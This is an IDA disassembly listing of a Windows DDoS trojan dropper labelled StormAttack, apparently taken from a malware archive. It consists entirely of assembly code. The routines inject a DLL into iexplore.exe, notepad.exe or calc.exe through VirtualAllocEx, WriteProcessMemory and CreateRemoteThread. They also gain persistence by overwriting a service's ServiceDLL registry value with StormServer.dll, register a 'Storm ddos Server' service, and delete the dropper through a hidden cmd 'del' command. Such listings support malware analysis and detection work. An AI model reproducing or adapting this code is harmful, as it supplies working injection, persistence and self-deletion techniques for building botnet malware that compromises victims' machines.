.ax:00401000 ;
.ax:00401000 ; +-------------------------------------------------------------------------+
.ax:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.ax:00401000 ; |           Copyright (c) 2026 Hex-Rays, <support@hex-rays.com>           |
.ax:00401000 ; |                      License info: 14-0000-FFFF-88                      |
.ax:00401000 ; |                       ntkey <admin@hex-rays.com>                        |
.ax:00401000 ; +-------------------------------------------------------------------------+
.ax:00401000 ;
.ax:00401000 ; Input SHA256 : 5BB61248F62945CD4933F00375C77EB094D22C55E33D6E57BBCF2127C19727B5
.ax:00401000 ; Input MD5    : 7C44CB81BD2A164922500B2CDAA12F35
.ax:00401000 ; Input CRC32  : 11440E5D
.ax:00401000 ; Compiler     : Visual C++
.ax:00401000
.ax:00401000 ; File Name   : /home/petik/Documents/petikvx-archiver/Articles/Trojan-DDoS.Win32.StormAttack.a/artefacts/stormattack_dropper.exe
.ax:00401000 ; Format      : Portable executable for 80386 (PE)
.ax:00401000 ; Imagebase   : 400000
.ax:00401000 ; Timestamp   : 4C540F4E (Sat Jul 31 11:55:58 2010 UTC)
.ax:00401000 ; Section 1. (virtual address 00001000)
.ax:00401000 ; Virtual size                  : 0000189A (   6298.)
.ax:00401000 ; Section size in file          : 00002000 (   8192.)
.ax:00401000 ; Offset to raw data for section: 00001000
.ax:00401000 ; Flags 60000020: Text Executable Readable
.ax:00401000 ; Alignment     : default
.ax:00401000 ; OS type         :  MS Windows
.ax:00401000 ; Application type:  Executable 32bit
.ax:00401000
.ax:00401000                 .686p
.ax:00401000                 .mmx
.ax:00401000                 .model flat
.ax:00401000
.ax:00401000 ; ===========================================================================
.ax:00401000
.ax:00401000 ; Segment type: Pure code
.ax:00401000 ; Segment permissions: Read/Execute
.ax:00401000 _ax             segment para public 'CODE' use32
.ax:00401000                 assume cs:_ax
.ax:00401000                 ;org 401000h
.ax:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.ax:00401000
.ax:00401000 ; =============== S U B R O U T I N E =======================================
.ax:00401000
.ax:00401000
.ax:00401000 ; int __cdecl sub_401000(LPSTR lpBuffer, char)
.ax:00401000 sub_401000      proc near               ; CODE XREF: sub_4010C0+22↓p
.ax:00401000                                         ; sub_4010C0+38↓p ...
.ax:00401000
.ax:00401000 lpBuffer        = dword ptr  4
.ax:00401000 arg_4           = byte ptr  8
.ax:00401000
.ax:00401000                 push    ebx
.ax:00401001                 mov     ebx, [esp+4+lpBuffer]
.ax:00401005                 push    esi
.ax:00401006                 push    edi
.ax:00401007                 test    ebx, ebx
.ax:00401009                 jz      loc_4010B2
.ax:0040100F                 mov     al, [esp+0Ch+arg_4]
.ax:00401013                 test    al, al
.ax:00401015                 jnz     short loc_401025
.ax:00401017                 push    104h            ; uSize
.ax:0040101C                 push    ebx             ; lpBuffer
.ax:0040101D                 call    ds:GetSystemWindowsDirectoryA ; KERNEL32
.ax:00401023                 jmp     short loc_401075
.ax:00401025 ; ---------------------------------------------------------------------------
.ax:00401025
.ax:00401025 loc_401025:                             ; CODE XREF: sub_401000+15↑j
.ax:00401025                 cmp     al, 1
.ax:00401027                 jnz     short loc_401037
.ax:00401029                 push    104h            ; uSize
.ax:0040102E                 push    ebx             ; lpBuffer
.ax:0040102F                 call    ds:GetSystemDirectoryA ; KERNEL32
.ax:00401035                 jmp     short loc_401075
.ax:00401037 ; ---------------------------------------------------------------------------
.ax:00401037
.ax:00401037 loc_401037:                             ; CODE XREF: sub_401000+27↑j
.ax:00401037                 cmp     al, 2
.ax:00401039                 jnz     short loc_401075
.ax:0040103B                 push    104h            ; uSize
.ax:00401040                 push    ebx             ; lpBuffer
.ax:00401041                 call    ds:GetSystemDirectoryA ; KERNEL32
.ax:00401047                 mov     edi, offset aProgramFilesIn ; "Program Files\\Internet Explorer"
.ax:0040104C                 or      ecx, 0FFFFFFFFh
.ax:0040104F                 xor     eax, eax
.ax:00401051                 mov     byte ptr [ebx+3], 0
.ax:00401055                 repne scasb
.ax:00401057                 not     ecx
.ax:00401059                 sub     edi, ecx
.ax:0040105B                 mov     esi, edi
.ax:0040105D                 mov     edx, ecx
.ax:0040105F                 mov     edi, ebx
.ax:00401061                 or      ecx, 0FFFFFFFFh
.ax:00401064                 repne scasb
.ax:00401066                 mov     ecx, edx
.ax:00401068                 dec     edi
.ax:00401069                 shr     ecx, 2
.ax:0040106C                 rep movsd
.ax:0040106E                 mov     ecx, edx
.ax:00401070                 and     ecx, 3
.ax:00401073                 rep movsb
.ax:00401075
.ax:00401075 loc_401075:                             ; CODE XREF: sub_401000+23↑j
.ax:00401075                                         ; sub_401000+35↑j ...
.ax:00401075                 mov     edi, ebx
.ax:00401077                 or      ecx, 0FFFFFFFFh
.ax:0040107A                 xor     eax, eax
.ax:0040107C                 repne scasb
.ax:0040107E                 not     ecx
.ax:00401080                 dec     ecx
.ax:00401081                 cmp     byte ptr [ecx+ebx-1], 5Ch ; '\'
.ax:00401086                 jz      short loc_4010B2
.ax:00401088                 mov     edi, offset asc_4042CC ; "\\"
.ax:0040108D                 or      ecx, 0FFFFFFFFh
.ax:00401090                 xor     eax, eax
.ax:00401092                 repne scasb
.ax:00401094                 not     ecx
.ax:00401096                 sub     edi, ecx
.ax:00401098                 mov     esi, edi
.ax:0040109A                 mov     edx, ecx
.ax:0040109C                 mov     edi, ebx
.ax:0040109E                 or      ecx, 0FFFFFFFFh
.ax:004010A1                 repne scasb
.ax:004010A3                 mov     ecx, edx
.ax:004010A5                 dec     edi
.ax:004010A6                 shr     ecx, 2
.ax:004010A9                 rep movsd
.ax:004010AB                 mov     ecx, edx
.ax:004010AD                 and     ecx, 3
.ax:004010B0                 rep movsb
.ax:004010B2
.ax:004010B2 loc_4010B2:                             ; CODE XREF: sub_401000+9↑j
.ax:004010B2                                         ; sub_401000+86↑j
.ax:004010B2                 pop     edi
.ax:004010B3                 pop     esi
.ax:004010B4                 pop     ebx
.ax:004010B5                 retn
.ax:004010B5 sub_401000      endp
.ax:004010B5
.ax:004010B5 ; ---------------------------------------------------------------------------
.ax:004010B6                 align 10h
.ax:004010C0
.ax:004010C0 ; =============== S U B R O U T I N E =======================================
.ax:004010C0
.ax:004010C0
.ax:004010C0 ; char __cdecl sub_4010C0(LPSTR lpBuffer)
.ax:004010C0 sub_4010C0      proc near               ; CODE XREF: sub_401150+E↓p
.ax:004010C0
.ax:004010C0 lpBuffer        = dword ptr  4
.ax:004010C0
.ax:004010C0                 push    ebx
.ax:004010C1                 mov     ebx, [esp+4+lpBuffer]
.ax:004010C5                 push    esi
.ax:004010C6                 push    edi
.ax:004010C7                 test    ebx, ebx
.ax:004010C9                 jz      short loc_401140
.ax:004010CB                 mov     ecx, 41h ; 'A'
.ax:004010D0                 xor     eax, eax
.ax:004010D2                 mov     edi, ebx
.ax:004010D4                 rep stosd
.ax:004010D6                 mov     al, byte_404125
.ax:004010DB                 test    al, al
.ax:004010DD                 jnz     short loc_4010F1
.ax:004010DF                 push    2               ; char
.ax:004010E1                 push    ebx             ; lpBuffer
.ax:004010E2                 call    sub_401000
.ax:004010E7                 add     esp, 8
.ax:004010EA                 mov     edi, offset aIexploreExe ; "iexplore.exe"
.ax:004010EF                 jmp     short loc_40111B
.ax:004010F1 ; ---------------------------------------------------------------------------
.ax:004010F1
.ax:004010F1 loc_4010F1:                             ; CODE XREF: sub_4010C0+1D↑j
.ax:004010F1                 cmp     al, 1
.ax:004010F3                 jnz     short loc_401107
.ax:004010F5                 push    0               ; char
.ax:004010F7                 push    ebx             ; lpBuffer
.ax:004010F8                 call    sub_401000
.ax:004010FD                 add     esp, 8
.ax:00401100                 mov     edi, offset aNotepadExe ; "notepad.exe"
.ax:00401105                 jmp     short loc_40111B
.ax:00401107 ; ---------------------------------------------------------------------------
.ax:00401107
.ax:00401107 loc_401107:                             ; CODE XREF: sub_4010C0+33↑j
.ax:00401107                 cmp     al, 2
.ax:00401109                 jnz     short loc_401140
.ax:0040110B                 push    1               ; char
.ax:0040110D                 push    ebx             ; lpBuffer
.ax:0040110E                 call    sub_401000
.ax:00401113                 add     esp, 8
.ax:00401116                 mov     edi, offset aCalcExe ; "calc.exe"
.ax:0040111B
.ax:0040111B loc_40111B:                             ; CODE XREF: sub_4010C0+2F↑j
.ax:0040111B                                         ; sub_4010C0+45↑j
.ax:0040111B                 or      ecx, 0FFFFFFFFh
.ax:0040111E                 xor     eax, eax
.ax:00401120                 repne scasb
.ax:00401122                 not     ecx
.ax:00401124                 sub     edi, ecx
.ax:00401126                 mov     esi, edi
.ax:00401128                 mov     edx, ecx
.ax:0040112A                 mov     edi, ebx
.ax:0040112C                 or      ecx, 0FFFFFFFFh
.ax:0040112F                 repne scasb
.ax:00401131                 mov     ecx, edx
.ax:00401133                 dec     edi
.ax:00401134                 shr     ecx, 2
.ax:00401137                 rep movsd
.ax:00401139                 mov     ecx, edx
.ax:0040113B                 and     ecx, 3
.ax:0040113E                 rep movsb
.ax:00401140
.ax:00401140 loc_401140:                             ; CODE XREF: sub_4010C0+9↑j
.ax:00401140                                         ; sub_4010C0+49↑j
.ax:00401140                 pop     edi
.ax:00401141                 pop     esi
.ax:00401142                 pop     ebx
.ax:00401143                 retn
.ax:00401143 sub_4010C0      endp
.ax:00401143
.ax:00401143 ; ---------------------------------------------------------------------------
.ax:00401144                 align 10h
.ax:00401150
.ax:00401150 ; =============== S U B R O U T I N E =======================================
.ax:00401150
.ax:00401150
.ax:00401150 ; DWORD (__stdcall *__cdecl sub_401150(LPCSTR lpString))(LPVOID lpThreadParameter)
.ax:00401150 sub_401150      proc near               ; CODE XREF: sub_401510+171↓p
.ax:00401150                                         ; sub_401B90+EA↓p ...
.ax:00401150
.ax:00401150 ProcessInformation= _PROCESS_INFORMATION ptr -158h
.ax:00401150 StartupInfo     = _STARTUPINFOA ptr -148h
.ax:00401150 CommandLine     = byte ptr -104h
.ax:00401150 lpString        = dword ptr  4
.ax:00401150
.ax:00401150                 sub     esp, 158h
.ax:00401156                 push    ebx
.ax:00401157                 push    esi
.ax:00401158                 lea     eax, [esp+160h+CommandLine]
.ax:0040115C                 push    edi
.ax:0040115D                 push    eax             ; lpBuffer
.ax:0040115E                 call    sub_4010C0
.ax:00401163                 add     esp, 4
.ax:00401166                 lea     ecx, [esp+164h+StartupInfo]
.ax:0040116A                 push    ecx             ; lpStartupInfo
.ax:0040116B                 call    ds:GetStartupInfoA ; KERNEL32
.ax:00401171                 lea     edx, [esp+164h+ProcessInformation]
.ax:00401175                 lea     eax, [esp+164h+StartupInfo]
.ax:00401179                 push    edx             ; lpProcessInformation
.ax:0040117A                 push    eax             ; lpStartupInfo
.ax:0040117B                 push    0               ; lpCurrentDirectory
.ax:0040117D                 push    0               ; lpEnvironment
.ax:0040117F                 push    0               ; dwCreationFlags
.ax:00401181                 push    1               ; bInheritHandles
.ax:00401183                 push    0               ; lpThreadAttributes
.ax:00401185                 lea     ecx, [esp+180h+CommandLine]
.ax:00401189                 push    0               ; lpProcessAttributes
.ax:0040118B                 push    ecx             ; lpCommandLine
.ax:0040118C                 push    0               ; lpApplicationName
.ax:0040118E                 mov     [esp+18Ch+StartupInfo.wShowWindow], 0
.ax:00401195                 mov     [esp+18Ch+StartupInfo.dwFlags], 101h
.ax:0040119D                 call    ds:CreateProcessA ; KERNEL32
.ax:004011A3                 test    eax, eax
.ax:004011A5                 jnz     short loc_4011B1
.ax:004011A7                 pop     edi
.ax:004011A8                 pop     esi
.ax:004011A9                 pop     ebx
.ax:004011AA                 add     esp, 158h
.ax:004011B0                 retn
.ax:004011B1 ; ---------------------------------------------------------------------------
.ax:004011B1
.ax:004011B1 loc_4011B1:                             ; CODE XREF: sub_401150+55↑j
.ax:004011B1                 mov     edi, [esp+164h+lpString]
.ax:004011B8                 mov     ebx, ds:lstrlenA ; KERNEL32
.ax:004011BE                 push    4               ; flProtect
.ax:004011C0                 push    1000h           ; flAllocationType
.ax:004011C5                 push    edi             ; lpString
.ax:004011C6                 call    ebx ; lstrlenA  ; KERNEL32
.ax:004011C8                 mov     edx, [esp+16Ch+ProcessInformation.hProcess]
.ax:004011CC                 inc     eax
.ax:004011CD                 push    eax             ; dwSize
.ax:004011CE                 push    0               ; lpAddress
.ax:004011D0                 push    edx             ; hProcess
.ax:004011D1                 call    ds:VirtualAllocEx ; KERNEL32
.ax:004011D7                 mov     esi, eax
.ax:004011D9                 test    esi, esi
.ax:004011DB                 jnz     short loc_4011E7
.ax:004011DD                 pop     edi
.ax:004011DE                 pop     esi
.ax:004011DF                 pop     ebx
.ax:004011E0                 add     esp, 158h
.ax:004011E6                 retn
.ax:004011E7 ; ---------------------------------------------------------------------------
.ax:004011E7
.ax:004011E7 loc_4011E7:                             ; CODE XREF: sub_401150+8B↑j
.ax:004011E7                 push    0               ; lpNumberOfBytesWritten
.ax:004011E9                 push    edi             ; lpString
.ax:004011EA                 call    ebx ; lstrlenA  ; KERNEL32
.ax:004011EC                 inc     eax
.ax:004011ED                 push    eax             ; nSize
.ax:004011EE                 mov     eax, [esp+16Ch+ProcessInformation.hProcess]
.ax:004011F2                 push    edi             ; lpBuffer
.ax:004011F3                 push    esi             ; lpBaseAddress
.ax:004011F4                 push    eax             ; hProcess
.ax:004011F5                 call    ds:WriteProcessMemory ; KERNEL32
.ax:004011FB                 test    eax, eax
.ax:004011FD                 jnz     short loc_401209
.ax:004011FF                 pop     edi
.ax:00401200                 pop     esi
.ax:00401201                 pop     ebx
.ax:00401202                 add     esp, 158h
.ax:00401208                 retn
.ax:00401209 ; ---------------------------------------------------------------------------
.ax:00401209
.ax:00401209 loc_401209:                             ; CODE XREF: sub_401150+AD↑j
.ax:00401209                 push    offset ProcName ; "LoadLibraryA"
.ax:0040120E                 push    offset ModuleName ; "Kernel32"
.ax:00401213                 call    ds:GetModuleHandleA ; KERNEL32
.ax:00401219                 push    eax             ; hModule
.ax:0040121A                 call    ds:GetProcAddress ; KERNEL32
.ax:00401220                 test    eax, eax
.ax:00401222                 jnz     short loc_40122E
.ax:00401224                 pop     edi
.ax:00401225                 pop     esi
.ax:00401226                 pop     ebx
.ax:00401227                 add     esp, 158h
.ax:0040122D                 retn
.ax:0040122E ; ---------------------------------------------------------------------------
.ax:0040122E
.ax:0040122E loc_40122E:                             ; CODE XREF: sub_401150+D2↑j
.ax:0040122E                 mov     ecx, [esp+164h+ProcessInformation.hProcess]
.ax:00401232                 push    0               ; lpThreadId
.ax:00401234                 push    0               ; dwCreationFlags
.ax:00401236                 push    esi             ; lpParameter
.ax:00401237                 push    eax             ; lpStartAddress
.ax:00401238                 push    0               ; dwStackSize
.ax:0040123A                 push    0               ; lpThreadAttributes
.ax:0040123C                 push    ecx             ; hProcess
.ax:0040123D                 call    ds:CreateRemoteThread ; KERNEL32
.ax:00401243                 neg     eax
.ax:00401245                 sbb     eax, eax
.ax:00401247                 pop     edi
.ax:00401248                 pop     esi
.ax:00401249                 pop     ebx
.ax:0040124A                 neg     eax
.ax:0040124C                 add     esp, 158h
.ax:00401252                 retn
.ax:00401252 sub_401150      endp
.ax:00401252
.ax:00401252 ; ---------------------------------------------------------------------------
.ax:00401253                 align 10h
.ax:00401260
.ax:00401260 ; =============== S U B R O U T I N E =======================================
.ax:00401260
.ax:00401260
.ax:00401260 ; void sub_401260()
.ax:00401260 sub_401260      proc near               ; CODE XREF: WinMain(x,x,x,x):loc_401E6A↓p
.ax:00401260
.ax:00401260 phkResult       = dword ptr -9Ch
.ax:00401260 var_98          = byte ptr -98h
.ax:00401260 var_94          = byte ptr -94h
.ax:00401260 var_90          = byte ptr -90h
.ax:00401260 Data            = byte ptr -8Ch
.ax:00401260 var_C           = dword ptr -0Ch
.ax:00401260 var_4           = dword ptr -4
.ax:00401260
.ax:00401260 ; FUNCTION CHUNK AT .ax:00402800 SIZE 00000020 BYTES
.ax:00401260
.ax:00401260 ; __unwind { // SEH_401260
.ax:00401260                 push    0FFFFFFFFh
.ax:00401262                 push    offset SEH_401260
.ax:00401267                 mov     eax, large fs:0
.ax:0040126D                 push    eax
.ax:0040126E                 mov     large fs:0, esp
.ax:00401275                 sub     esp, 90h
.ax:0040127B                 push    esi
.ax:0040127C                 push    edi
.ax:0040127D                 push    offset aSystemrootSyst ; "%SystemRoot%\\System32\\"
.ax:00401282                 lea     ecx, [esp+0A8h+var_98] ; this
.ax:00401286                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:0040128B                 lea     eax, [esp+0A4h+var_98]
.ax:0040128F                 push    offset aStormserverDll ; "StormServer.dll"
.ax:00401294                 lea     ecx, [esp+0A8h+var_90]
.ax:00401298                 push    eax
.ax:00401299                 push    ecx
.ax:0040129A                 mov     [esp+0B0h+var_4], 0
.ax:004012A5                 call    ??H@YG?AVCString@@ABV0@PBD@Z ; operator+(CString const &,char const *)
.ax:004012AA                 push    offset unk_4044F0
.ax:004012AF                 lea     edx, [esp+0A8h+var_94]
.ax:004012B3                 push    eax
.ax:004012B4                 push    edx
.ax:004012B5                 mov     byte ptr [esp+0B0h+var_4], 1
.ax:004012BD                 call    ??H@YG?AVCString@@ABV0@PBD@Z ; operator+(CString const &,char const *)
.ax:004012C2                 mov     eax, [eax]
.ax:004012C4                 or      ecx, 0FFFFFFFFh
.ax:004012C7                 mov     edi, eax
.ax:004012C9                 xor     eax, eax
.ax:004012CB                 repne scasb
.ax:004012CD                 not     ecx
.ax:004012CF                 sub     edi, ecx
.ax:004012D1                 lea     edx, [esp+0A4h+Data]
.ax:004012D5                 mov     eax, ecx
.ax:004012D7                 mov     esi, edi
.ax:004012D9                 mov     edi, edx
.ax:004012DB                 shr     ecx, 2
.ax:004012DE                 rep movsd
.ax:004012E0                 mov     ecx, eax
.ax:004012E2                 and     ecx, 3
.ax:004012E5                 rep movsb
.ax:004012E7                 lea     ecx, [esp+0A4h+var_94] ; this
.ax:004012EB                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:004012F0                 lea     ecx, [esp+0A4h+var_90] ; this
.ax:004012F4                 mov     byte ptr [esp+0A4h+var_4], 0
.ax:004012FC                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401301                 lea     ecx, [esp+0A4h+phkResult]
.ax:00401305                 push    ecx             ; phkResult
.ax:00401306                 push    offset SubKey   ; "SYSTEM\\CurrentControlSet\\Services\\La"...
.ax:0040130B                 push    80000002h       ; hKey
.ax:00401310                 call    ds:RegOpenKeyA  ; ADVAPI32
.ax:00401316                 mov     edx, [esp+0A4h+phkResult]
.ax:0040131A                 push    offset ValueName ; "ServiceDLL"
.ax:0040131F                 push    edx             ; hKey
.ax:00401320                 call    ds:RegDeleteValueA ; ADVAPI32
.ax:00401326                 mov     ecx, [esp+0A4h+phkResult]
.ax:0040132A                 lea     eax, [esp+0A4h+Data]
.ax:0040132E                 push    80h             ; cbData
.ax:00401333                 push    eax             ; lpData
.ax:00401334                 push    2               ; dwType
.ax:00401336                 push    0               ; Reserved
.ax:00401338                 push    offset ValueName ; "ServiceDLL"
.ax:0040133D                 push    ecx             ; hKey
.ax:0040133E                 call    ds:RegSetValueExA ; ADVAPI32
.ax:00401344                 mov     edx, [esp+0A4h+phkResult]
.ax:00401348                 push    edx             ; hKey
.ax:00401349                 call    ds:RegCloseKey  ; ADVAPI32
.ax:0040134F                 push    32h ; '2'       ; dwMilliseconds
.ax:00401351                 call    ds:Sleep        ; KERNEL32
.ax:00401357                 lea     ecx, [esp+0A4h+var_98] ; this
.ax:0040135B                 mov     [esp+0A4h+var_4], 0FFFFFFFFh
.ax:00401366                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:0040136B                 mov     ecx, [esp+0A4h+var_C]
.ax:00401372                 pop     edi
.ax:00401373                 pop     esi
.ax:00401374                 mov     large fs:0, ecx
.ax:0040137B                 add     esp, 9Ch
.ax:00401381                 retn
.ax:00401381 ; } // starts at 401260
.ax:00401381 sub_401260      endp
.ax:00401381
.ax:00401381 ; ---------------------------------------------------------------------------
.ax:00401382                 align 10h
.ax:00401390
.ax:00401390 ; =============== S U B R O U T I N E =======================================
.ax:00401390
.ax:00401390
.ax:00401390 ; int sub_401390()
.ax:00401390 sub_401390      proc near               ; CODE XREF: WinMain(x,x,x,x):loc_401EDC↓p
.ax:00401390                                         ; WinMain(x,x,x,x)+2B8↓p ...
.ax:00401390
.ax:00401390 ProcessInformation= _PROCESS_INFORMATION ptr -360h
.ax:00401390 StartupInfo     = _STARTUPINFOA ptr -350h
.ax:00401390 Filename        = byte ptr -30Ch
.ax:00401390 String1         = byte ptr -208h
.ax:00401390 Buffer          = byte ptr -104h
.ax:00401390
.ax:00401390                 sub     esp, 360h
.ax:00401396                 lea     eax, [esp+360h+Filename]
.ax:0040139A                 push    ebx
.ax:0040139B                 push    ebp
.ax:0040139C                 push    esi
.ax:0040139D                 push    edi
.ax:0040139E                 push    104h            ; nSize
.ax:004013A3                 xor     ebx, ebx
.ax:004013A5                 push    eax             ; lpFilename
.ax:004013A6                 push    ebx             ; hModule
.ax:004013A7                 call    ds:GetModuleFileNameA ; KERNEL32
.ax:004013AD                 test    eax, eax
.ax:004013AF                 jz      loc_4014FD
.ax:004013B5                 lea     ecx, [esp+370h+Filename]
.ax:004013B9                 push    104h            ; cchBuffer
.ax:004013BE                 lea     edx, [esp+374h+Filename]
.ax:004013C2                 push    ecx             ; lpszShortPath
.ax:004013C3                 push    edx             ; lpszLongPath
.ax:004013C4                 call    ds:GetShortPathNameA ; KERNEL32
.ax:004013CA                 test    eax, eax
.ax:004013CC                 jz      loc_4014FD
.ax:004013D2                 lea     eax, [esp+370h+Buffer]
.ax:004013D9                 push    104h            ; nSize
.ax:004013DE                 push    eax             ; lpBuffer
.ax:004013DF                 push    offset Name     ; "COMSPEC"
.ax:004013E4                 call    ds:GetEnvironmentVariableA ; KERNEL32
.ax:004013EA                 test    eax, eax
.ax:004013EC                 jz      loc_4014FD
.ax:004013F2                 lea     ecx, [esp+370h+String1]
.ax:004013F9                 push    offset String2  ; " /c  del "
.ax:004013FE                 push    ecx             ; lpString1
.ax:004013FF                 call    ds:lstrcpyA     ; KERNEL32
.ax:00401405                 mov     esi, ds:lstrcatA ; KERNEL32
.ax:0040140B                 lea     edx, [esp+370h+Filename]
.ax:0040140F                 lea     eax, [esp+370h+String1]
.ax:00401416                 push    edx             ; lpString2
.ax:00401417                 push    eax             ; lpString1
.ax:00401418                 call    esi ; lstrcatA  ; KERNEL32
.ax:0040141A                 lea     ecx, [esp+370h+String1]
.ax:00401421                 push    offset aNul     ; " > nul"
.ax:00401426                 push    ecx             ; lpString1
.ax:00401427                 call    esi ; lstrcatA  ; KERNEL32
.ax:00401429                 lea     edx, [esp+370h+String1]
.ax:00401430                 lea     eax, [esp+370h+Buffer]
.ax:00401437                 push    edx             ; lpString2
.ax:00401438                 push    eax             ; lpString1
.ax:00401439                 call    esi ; lstrcatA  ; KERNEL32
.ax:0040143B                 mov     ecx, 10h
.ax:00401440                 xor     eax, eax
.ax:00401442                 lea     edi, [esp+370h+StartupInfo.lpReserved]
.ax:00401446                 mov     [esp+370h+ProcessInformation.hProcess], ebx
.ax:0040144A                 rep stosd
.ax:0040144C                 xor     ecx, ecx
.ax:0040144E                 mov     [esp+370h+StartupInfo.wShowWindow], bx
.ax:00401453                 mov     ebx, ds:GetCurrentProcess ; KERNEL32
.ax:00401459                 mov     [esp+370h+ProcessInformation.hThread], ecx
.ax:0040145D                 mov     [esp+370h+ProcessInformation.dwProcessId], ecx
.ax:00401461                 push    100h            ; dwPriorityClass
.ax:00401466                 mov     [esp+374h+ProcessInformation.dwThreadId], ecx
.ax:0040146A                 mov     [esp+374h+StartupInfo.cb], 44h ; 'D'
.ax:00401472                 mov     [esp+374h+StartupInfo.dwFlags], 1
.ax:0040147A                 call    ebx ; GetCurrentProcess ; KERNEL32
.ax:0040147C                 mov     esi, ds:SetPriorityClass ; KERNEL32
.ax:00401482                 push    eax             ; hProcess
.ax:00401483                 call    esi ; SetPriorityClass ; KERNEL32
.ax:00401485                 mov     ebp, ds:GetCurrentThread ; KERNEL32
.ax:0040148B                 push    0Fh             ; nPriority
.ax:0040148D                 call    ebp ; GetCurrentThread ; KERNEL32
.ax:0040148F                 mov     edi, ds:SetThreadPriority ; KERNEL32
.ax:00401495                 push    eax             ; hThread
.ax:00401496                 call    edi ; SetThreadPriority ; KERNEL32
.ax:00401498                 lea     edx, [esp+370h+ProcessInformation]
.ax:0040149C                 lea     eax, [esp+370h+StartupInfo]
.ax:004014A0                 push    edx             ; lpProcessInformation
.ax:004014A1                 push    eax             ; lpStartupInfo
.ax:004014A2                 push    0               ; lpCurrentDirectory
.ax:004014A4                 push    0               ; lpEnvironment
.ax:004014A6                 push    0Ch             ; dwCreationFlags
.ax:004014A8                 push    0               ; bInheritHandles
.ax:004014AA                 push    0               ; lpThreadAttributes
.ax:004014AC                 lea     ecx, [esp+38Ch+Buffer]
.ax:004014B3                 push    0               ; lpProcessAttributes
.ax:004014B5                 push    ecx             ; lpCommandLine
.ax:004014B6                 push    0               ; lpApplicationName
.ax:004014B8                 call    ds:CreateProcessA ; KERNEL32
.ax:004014BE                 test    eax, eax
.ax:004014C0                 jz      short loc_4014EF
.ax:004014C2                 mov     edx, [esp+370h+ProcessInformation.hProcess]
.ax:004014C6                 push    40h ; '@'       ; dwPriorityClass
.ax:004014C8                 push    edx             ; hProcess
.ax:004014C9                 call    esi ; SetPriorityClass ; KERNEL32
.ax:004014CB                 mov     eax, [esp+370h+ProcessInformation.hThread]
.ax:004014CF                 push    0FFFFFFF1h      ; nPriority
.ax:004014D1                 push    eax             ; hThread
.ax:004014D2                 call    edi ; SetThreadPriority ; KERNEL32
.ax:004014D4                 mov     ecx, [esp+370h+ProcessInformation.hThread]
.ax:004014D8                 push    ecx             ; hThread
.ax:004014D9                 call    ds:ResumeThread ; KERNEL32
.ax:004014DF                 pop     edi
.ax:004014E0                 pop     esi
.ax:004014E1                 pop     ebp
.ax:004014E2                 mov     eax, 1
.ax:004014E7                 pop     ebx
.ax:004014E8                 add     esp, 360h
.ax:004014EE                 retn
.ax:004014EF ; ---------------------------------------------------------------------------
.ax:004014EF
.ax:004014EF loc_4014EF:                             ; CODE XREF: sub_401390+130↑j
.ax:004014EF                 push    20h ; ' '       ; dwPriorityClass
.ax:004014F1                 call    ebx ; GetCurrentProcess ; KERNEL32
.ax:004014F3                 push    eax             ; hProcess
.ax:004014F4                 call    esi ; SetPriorityClass ; KERNEL32
.ax:004014F6                 push    0               ; nPriority
.ax:004014F8                 call    ebp ; GetCurrentThread ; KERNEL32
.ax:004014FA                 push    eax             ; hThread
.ax:004014FB                 call    edi ; SetThreadPriority ; KERNEL32
.ax:004014FD
.ax:004014FD loc_4014FD:                             ; CODE XREF: sub_401390+1F↑j
.ax:004014FD                                         ; sub_401390+3C↑j ...
.ax:004014FD                 pop     edi
.ax:004014FE                 pop     esi
.ax:004014FF                 pop     ebp
.ax:00401500                 xor     eax, eax
.ax:00401502                 pop     ebx
.ax:00401503                 add     esp, 360h
.ax:00401509                 retn
.ax:00401509 sub_401390      endp
.ax:00401509
.ax:00401509 ; ---------------------------------------------------------------------------
.ax:0040150A                 align 10h
.ax:00401510
.ax:00401510 ; =============== S U B R O U T I N E =======================================
.ax:00401510
.ax:00401510
.ax:00401510 ; void sub_401510()
.ax:00401510 sub_401510      proc near               ; DATA XREF: WinMain(x,x,x,x)+269↓o
.ax:00401510
.ax:00401510 lpString        = dword ptr -220h
.ax:00401510 var_21C         = dword ptr -21Ch
.ax:00401510 var_218         = dword ptr -218h
.ax:00401510 Buffer          = byte ptr -214h
.ax:00401510 var_110         = byte ptr -110h
.ax:00401510 var_C           = dword ptr -0Ch
.ax:00401510 var_4           = dword ptr -4
.ax:00401510
.ax:00401510 ; FUNCTION CHUNK AT .ax:00402820 SIZE 00000020 BYTES
.ax:00401510
.ax:00401510 ; __unwind { // SEH_401510
.ax:00401510                 push    0FFFFFFFFh
.ax:00401512                 push    offset SEH_401510
.ax:00401517                 mov     eax, large fs:0
.ax:0040151D                 push    eax
.ax:0040151E                 mov     large fs:0, esp
.ax:00401525                 sub     esp, 214h
.ax:0040152B                 push    ebx
.ax:0040152C                 push    ebp
.ax:0040152D                 push    esi
.ax:0040152E                 push    edi
.ax:0040152F                 push    offset HandlerProc ; lpHandlerProc
.ax:00401534                 push    offset ServiceName ; "Storm ddos Server"
.ax:00401539                 call    ds:RegisterServiceCtrlHandlerA ; ADVAPI32
.ax:0040153F                 mov     ebp, ds:SetServiceStatus ; ADVAPI32
.ax:00401545                 xor     ebx, ebx
.ax:00401547                 push    offset ServiceStatus ; lpServiceStatus
.ax:0040154C                 push    eax             ; hServiceStatus
.ax:0040154D                 mov     hServiceStatus, eax
.ax:00401552                 mov     ServiceStatus.dwServiceType, 20h ; ' '
.ax:0040155C                 mov     ServiceStatus.dwControlsAccepted, 7
.ax:00401566                 mov     ServiceStatus.dwWin32ExitCode, ebx
.ax:0040156C                 mov     ServiceStatus.dwWaitHint, 7D0h
.ax:00401576                 mov     ServiceStatus.dwCheckPoint, 1
.ax:00401580                 mov     ServiceStatus.dwCurrentState, 2
.ax:0040158A                 call    ebp ; SetServiceStatus ; ADVAPI32
.ax:0040158C                 push    1F4h            ; dwMilliseconds
.ax:00401591                 mov     ServiceStatus.dwCheckPoint, ebx
.ax:00401597                 call    ds:Sleep        ; KERNEL32
.ax:0040159D                 mov     eax, hServiceStatus
.ax:004015A2                 push    offset ServiceStatus ; lpServiceStatus
.ax:004015A7                 push    eax             ; hServiceStatus
.ax:004015A8                 mov     ServiceStatus.dwCurrentState, 4
.ax:004015B2                 call    ebp ; SetServiceStatus ; ADVAPI32
.ax:004015B4                 mov     cl, byte_404124
